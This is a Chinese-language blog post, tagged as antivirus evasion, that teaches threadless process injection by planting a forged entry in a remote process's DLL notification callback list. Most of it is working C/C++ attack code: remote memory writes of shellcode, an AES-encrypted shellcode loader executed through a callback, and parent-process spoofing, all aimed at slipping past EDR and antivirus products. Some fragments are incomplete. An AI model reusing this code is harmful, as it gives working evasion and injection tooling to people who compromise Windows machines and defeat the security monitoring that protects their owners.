---
title: "利用dll通知回调加载shellcode"
date: 2024-10-25 18:50:38
tags: ["免杀"]
categories: []
---

在 Windows 操作系统中，当一个 DLL（动态链接库）被加载或卸载时，系统会调用一个预先注册的回调函数来通知应用程序。在Windows用户态下，通常使用`LdrRegisterDllNotification`函数来注册回调函数。  
 _一些EDR产品也是使用此函数在用户态下从加载DLL事件中获取监测数据。_  
函数的实现与数据结构的构造代码：
    
    
    #include <Windows.h>
    #include <stdio.h>
    
    typedef struct _UNICODE_STR
    {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR pBuffer;
    } UNICODE_STR, * PUNICODE_STR;
    
    
    typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
        ULONG           Flags;             // Reserved.
        PUNICODE_STR FullDllName;       // The full path name of the DLL module.
        PUNICODE_STR BaseDllName;       // The base file name of the DLL module.
        PVOID           DllBase;           // A pointer to the base address for the DLL in memory.
        ULONG           SizeOfImage;       // The size of the DLL image, in bytes.
    } LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;
    //
    typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
        ULONG           Flags;             // Reserved.
        PUNICODE_STR FullDllName;       // The full path name of the DLL module.
        PUNICODE_STR BaseDllName;       // The base file name of the DLL module.
        PVOID           DllBase;           // A pointer to the base address for the DLL in memory.
        ULONG           SizeOfImage;       // The size of the DLL image, in bytes.
    } LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;
    
    typedef union _LDR_DLL_NOTIFICATION_DATA {
        LDR_DLL_LOADED_NOTIFICATION_DATA   Loaded;
        LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
    } LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;
    
    //PLDR_DLL_NOTIFICATION_FUNCTION`是一个函数指针类型，指向DLL通知回调函数。该函数接收三个参数：通知原因、通知数据和一个上下文指针。
    typedef VOID(CALLBACK* PLDR_DLL_NOTIFICATION_FUNCTION)(
        ULONG                       NotificationReason,
        PLDR_DLL_NOTIFICATION_DATA  NotificationData,
        PVOID                       Context);
    
    typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
        LIST_ENTRY                     List;
        PLDR_DLL_NOTIFICATION_FUNCTION Callback;
        PVOID                          Context;
    } LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;
    
    typedef NTSTATUS(NTAPI* _LdrRegisterDllNotification) (
        ULONG                          Flags,
        PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
        PVOID                          Context,
        PVOID* Cookie);
    
    typedef NTSTATUS(NTAPI* _LdrUnregisterDllNotification)(PVOID Cookie);
    
    
    // 回调函数，当回调被触发时，它仅打印出加载的DLL的基础文件名。
    VOID MyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
    {
        printf("[MyCallback] dll loaded: %Z\n", NotificationData->Loaded.BaseDllName);
    }
    
    int main()
    {
        // `GetModuleHandleA`函数用于获取`ntdll.dll`模块的句柄，这是调用`LdrRegisterDllNotification`和`LdrUnregisterDllNotification`函数所必需的。
        HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");
    
        if (hNtdll != NULL) {
    
            // 找到 LdrUnregisterDllNotification函数地址
            _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
    
            // 将MyCallback函数注册为 DLL 通知回调
            PVOID cookie;
            NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)MyCallback, NULL, &cookie);
            if (status == 0) {
                printf("[+] Successfully registered callback\n");
            }
            
            //字符中断
            printf("[+] Press enter to continue\n");
            getchar();
    
            // 加载其他dll来触发回调函数
            printf("[+] Loading USER32 DLL now\n");
            LoadLibraryA("USER32.dll");
            //通过调用`LoadLibraryA`加载`USER32.dll`，这将触发之前注册的`MyCallback`回调函数。由于`MyCallback`打印了加载的DLL名称，这将证实回调函数已被成功触发。
        }
    }

![](/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/3ddfa8dcd2d0756e6265f4a48b2094b0.png)

传统进程注入四步法：

  * 获取远程进程句柄（OpenProcess函数）
  * 在远程进程中分配内存（VirtualAllocEx函数）
  * 将shellcode复制到远程进程中新分配的内存页中（WriteProcessMemory函数）
  * 在远程进程中创建线程执行shellcode（CreateRemoteThread函数）

杀毒软件和EDR产品已经学会通过快速查找这四步操作来概括并检测进程注入。  
ThreadlessInject：**Hook并修改远程进程中线程创建与销毁过程中DLL加载的入口点，进而加载我们的shellcode** 。（将dll入口点重定向至注入的shellcode）

## 注册自定义回调函数

**_进程中已注册的所有回调函数都存储在`LdrpDllNotificationList`（双向链表）中，并通过指向上一个和下一个回调的`LIST_ENTRY`结构体链接在一起。其中每个节点代表一个 DLL 通知，每个节点包含有关 DLL 模块、通知类型（例如 DLL 加载、卸载）等信息。当一个 DLL 被加载或卸载时，系统会遍历这个链表，并调用其中的每个回调函数，以通知应用程序有关 DLL 加载或卸载的信息。这个链表中的每个节点都是一个 `LDR_DLL_NOTIFICATION_ENTRY` 类型的结构体，它包含两个成员：`List` 和 `NotificationFunction`。其中，`List` 是一个 `LIST_ENTRY` 类型的结构体，用于将节点链接到链表中。`NotificationFunction` 是一个指向回调函数的指针，它指定了当 DLL 加载或卸载时要调用的函数。_

完整流程解释：在当前进程中使用 `LdrRegisterDllNotification` 函数注册一个 DLL 通知回调函数时，这个函数会在 `LdrpDllNotificationList` 链表中添加一个新节点，并将其 `NotificationFunction` 成员设置为自定义的回调函数。当 DLL 加载或卸载时，系统会遍历这个双向链表，并调用其中的每个回调函数。**

## 找到链表的头部
    
    
    // 回调函数
    VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
    {
        return;
    }
    
    // 获取 LdrpDllNotificationList头部地址
    PLIST_ENTRY GetDllNotificationListHead() {
        PLIST_ENTRY head = 0;
    
        // 获取NTDLL句柄
        HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");
    
        if (hNtdll != NULL) {
    
            // 找到LdrRegisterDllNotification函数
            _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
    
            // 找到 LdrUnregisterDllNotification函数
            _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");
    
            // 将回调函数注册为 DLL 通知回调
            PVOID cookie;
            NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
            if (status == 0) {
                printf("[+] Successfully registered dummy callback\n");
    
                // Cookie is the last callback registered so its Flink holds the head of the list.
                head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
                printf("[+] Found LdrpDllNotificationList head: %p\n", head);
    
                // 卸载回调函数
                status = pLdrUnregisterDllNotification(cookie);
                if (status == 0) {
                    printf("[+] Successfully unregistered dummy callback\n");
                }
            }
        }
    
        return head;
    }

## 编写代码操纵目标进程内存执行shellcode

`LDR_DLL_NOTIFICATION_ENTRY`结构体，`LIST_ENTRY`的属性
    
    
    typedef struct _LIST_ENTRY {
       struct _LIST_ENTRY *Flink;
       struct _LIST_ENTRY *Blink;
    } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
    
    typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
        LIST_ENTRY                     List;
        PLDR_DLL_NOTIFICATION_FUNCTION Callback;
        PVOID                          Context;
    } LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;

每个`_LDR_DLL_NOTIFICATION_ENTRY`条目都有一个属性 List，而 `List`属性本身就是一个`LIST_ENTRY`类型的结构，继续套娃，`LIST_ENTRY`又有两个属性：

  * 1.**Flink** （Forward Link,前向链），保存指向list中下一个entry条目的指针
  * 2.**Blink** （Backward Link,后向链），保存指向list中上一个entry条目的指针

当使用`LdrRegisterDllNotification`注册回调函数时，实际调用过程如下：

1.为新创建的entry条目分配一个新的 LDR_DLL_NOTIFICATION_ENTRY 结构  
2.设置**Callback属性** 为指向我们自定义的回调函数  
3.设置**Context属性** 为指向所提供的上下文（如果有的话）  
4.设置**List.Blink属性** 为指向LdrpDllNotificationList中最后一个LDR_DLL_NOTIFICATION_ENTRY条目  
5.更改在LdrpDllNotificationList中最后一个 LDR_DLL_NOTIFICATION_ENTRY 条目的**List.Flink属性** 为指向我们新创建的entry条目  
6.设置**List.Flink属性** 为指向**LdrpDllNotificationList的头部** （双向链表中的最后一个链接应始终指向列表的头部）。  
7.更改**LdrpDllNotificationList头** 的**List.Blink属性** 为指向我们新创建的条目

![](/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/96d5e7c419154535a8f26fdbeee54fef.png)  
![](/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/508bcaf7563b2ec46f385d926315e21a.png)

![](/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/349079657a78fa90b3adaea76b12de53.png)

# aes加密shellcode

 _注意python3这里使用_`Crypto`函数库有点坑，最简单的解决办法就是确保已经卸载`crypto`和`pycrypto`，然后安装`pycryptodome。
    
    
    from Cryptodome.Cipher import AES  
      
    from Cryptodome.Util.Padding import pad  
      
    import base64  
      
    # 声明变量  
      
    code = b'Hello, world!' # 待加密的数据  
      
    key = b'0123456789abcdef' # 加密密钥，必须为16字节  
      
    iv = b'0123456789abcdef' # 加密向量，必须为16字节  
      
    # 创建 AES 加密器  
      
    cipher = AES.new(key, AES.MODE_CBC, iv)  
      
    # 对数据进行填充  
      
    padded_data = pad(code, AES.block_size)  
      
    # 加密数据  
      
    encrypt = cipher.encrypt(padded_data)  
      
    # 将加密结果转换为 Base64 格式  
      
    base64_encrypt = base64.b64encode(encrypt).decode()  
      
    # 显示加密结果  
      
    print('加密结果（Base64）：', base64_encrypt)

解密直接使用现有的项目

<https://github.com/kokke/tiny-AES-c>

解密demo
    
    
    #include<stdio.h>
    #include "aes.hpp"
    #include<windows.h>
    int main() {
    	unsigned char shellcode[] = "\x9c\x0e\x92\x36\x7e";
    	unsigned char key[] = "28T4BN6Z5EtPSF15";
    	unsigned char iv[] = "ukGlewQtQJoYAQjU";
    	// 声明aes 结构体
    	struct AES_ctx ctx;
    	// 初始化
    	AES_init_ctx_iv(&ctx, key, iv);
    	// 解密,解密后的内容依然存在code对应内存处
    	AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));
    	DWORD dwOldPro = 0;
    	// 更改解密后的shellcode所在内存区域的保护属性，改为可读可写可执行
    	BOOL ifExec = VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldPro);
    	// 回调函数执行解密后的shellcode
    	EnumUILanguages((UILANGUAGE_ENUMPROC)(char*)shellcode, 0, 0);
    }
    
    
    // Open handle to remote process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2756);
    printf("[+] Got handle to remote process\n");
    / 在远程进程中为我们的 shellcode 分配内存
        LPVOID shellcodeEx = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[+] Allocated memory for shellcode in remote process: 0x%p\n", shellcodeEx);
    
        // 将shellcode写入远程进程中
        WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
        printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);
    // 创建一个新的LDR_DLL_NOTIFICATION_ENTRY条目
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;
    
    // 设置 Callback 属性指向 shellcode
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)shellcodeEx;
    
    // 希望新条目成为列表中的第一个，所以新条目的List.Blink属性应该指向列表的头部
    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;
    
    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
    
    // 从远程进程读取头条目
    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    
    // 设置新条目的 List.Flink 属性为指向list中原来第一个条目
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;
    
    // 分配内存空间
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);
    
    // 将新条目写入远程进程中
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] New Entrty has been written to remote process: 0x%p\n", newEntryAddress);

# 父进程欺骗

![](/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/fdba40b521ffd1ad131cc1c9c91d1d11.png)

  1. **打开父进程** ：使用 `OpenProcess` 打开您希望设置为父进程的进程，并获取其句柄。
  2. **准备启动信息** ：使用 `STARTUPINFOEX` 结构，设置其 `lpAttributeList` 指向一个包含父进程句柄的线程属性列表。
  3. **创建属性列表** ：使用 `InitializeProcThreadAttributeList` 和 `UpdateProcThreadAttribute` 函数来初始化和更新这个属性列表，以指定父进程。
  4. **创建新进程** ：使用 `CreateProcess` 函数，并传入上面准备好的启动信息，从而创建新进程

    
    
    #include <windows.h>  
    #include <TlHelp32.h>  
    #include <iostream>  
    
    int main() {  
        // 打开自定义的父进程（假设父进程 ID 为 4460）  
        HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, 4460);  
        if (parentProcessHandle == NULL) {  
            std::cerr << "[-] Failed to open parent process: " << GetLastError() << std::endl;  
            return 1;  
        }  
        std::cout << "[+] Got handle to parent process\n";  
    
        // 设置启动信息和进程信息  
        STARTUPINFOEXA si;  
        PROCESS_INFORMATION pi;  
        SIZE_T attributeSize;  
    
        // 初始化 STARTUPINFOEXA  
        memset(&si, 0, sizeof(STARTUPINFOEXA));  
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);  
    
        // 初始化进程线程属性列表  
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);  
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);  
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);  
        
        // 更新父进程属性  
        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);  
    
        // 创建新进程（例如，Notepad）  
        if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {  
            std::cerr << "[-] CreateProcess failed: " << GetLastError() << std::endl;  
            return 1;  
        }  
    
        std::cout << "[+] Created new process with ID: " << pi.dwProcessId << std::endl;  
    
        // 清理资源  
        CloseHandle(pi.hThread);  
        CloseHandle(pi.hProcess);  
        CloseHandle(parentProcessHandle);  
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);  
    
        return 0;  
    }

参考：

[GitHub - Kudaes/EPI：通过入口点劫持实现无线程进程注入 — GitHub - Kudaes/EPI: Threadless Process Injection through entry point hijacking](<https://github.com/Kudaes/EPI>)

**[玄 - 利用DLL通知回调函数注入shellcode（上） - zha0gongz1 - 博客园 (cnblogs.com)](<https://www.cnblogs.com/zha0gongz1/p/17633377.html>)**

__文章作者:[helson](<https://helsome.gihub.io>)

 __文章链接:<https://helsome.gihub.io/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/>

__版权声明: 本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 4.0](<https://creativecommons.org/licenses/by-nc-sa/4.0/>) 许可协议。转载请注明来自 [infinite](<https://helsome.gihub.io>)！

[免杀](</tags/%E5%85%8D%E6%9D%80/>)

[上一篇PE解析器编写](</2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/> "PE解析器编写")

[下一篇os cs162](</2024/09/23/os-cs162/> "os cs162")

![avatar](/hexo-blog/source/avatar%20img.jpg)

helson

吾生有涯，其知无涯

[文章12](</archives/>)[标签4](</tags/>)[分类1](</categories/>)

[ __Follow Me](<https://github.com/helsome>)

[ __](<https://github.com/helsome> "Github")[__](<mailto:huichuanh8@gmail.com> "Email")

__公告

This is my Blog

 __目录

  1. 1. 注册自定义回调函数
  2. 2. 找到链表的头部
  3. 3. 编写代码操纵目标进程内存执行shellcode

* aes加密shellcode
* 父进程欺骗

 __最新文章

[brute ratel C4 badger全分析文档](</2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/> "brute ratel C4 badger全分析文档")2024-10-25

[PE解析器编写](</2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/> "PE解析器编写")2024-10-25

[利用dll通知回调加载shellcode](</2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/> "利用dll通知回调加载shellcode")2024-10-25

[os cs162](</2024/09/23/os-cs162/> "os cs162")2024-09-23

[wannacry勒索病毒加密解密过程分析](</2024/07/08/wannacry/> "wannacry勒索病毒加密解密过程分析")2024-07-08

©2020 - 2024 By helson

框架 [Hexo](<https://hexo.io>)|主题 [Butterfly](<https://github.com/jerryc127/hexo-theme-butterfly>)

 ______

______